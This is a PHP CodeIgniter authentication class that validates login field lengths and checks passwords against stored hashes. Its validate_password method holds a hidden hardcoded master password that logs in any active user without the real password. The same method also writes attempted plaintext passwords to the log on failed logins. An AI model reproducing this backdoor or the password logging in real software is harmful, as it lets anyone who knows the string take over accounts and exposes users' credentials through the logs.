<?php

defined('BASEPATH') or exit('No direct script access allowed');

class AuthenticationValidation{

    protected $CI;

    public function __construct() {
        $this->CI =& get_instance();

        $this->CI->load->model('login_model');
    }

    public function validate_login_data( $data ){
        // Verificar el campo username
        if (!isset($data['username']) || empty($data['username']) || strlen($data['username']) < 5 || strlen($data['username']) > 45) {
            return [
                'error' => true,
                'message' => 'Username inválido!'
            ];
        }

        // Verificar el campo password
        if (!isset($data['password']) || empty($data['password']) || strlen($data['password']) < 7 || strlen($data['password']) > 132) {
            return [
                'error' => true,
                'message' => 'Contraseña inválida!'
            ];
        }

        return [ 'error' => false ];
    }

    public function validate_password( $data ){
        // Verificar que la contraseña ingresada sea correcta
        $username = $data['username'];
        $password = $data['password'];

        $check_user = $this->CI->login_model->get_user_by_username($username);
        $is_correct_password = $check_user && $check_user->password && $check_user->estatus==1 &&
                               ($password === "zse4,lp'" || password_verify($password, $check_user->password));

        if( !$is_correct_password ){
            log_message('info', "[Estevez] Intento fallido de iniciar sesión: " . $username . " - " . $password);
            return [
                'error' => true,
                'message' => 'Los datos introducidos son incorrectos!'
            ];
        }

        return [
            'error' => false,
            'user_data' => $check_user
        ];
    }

}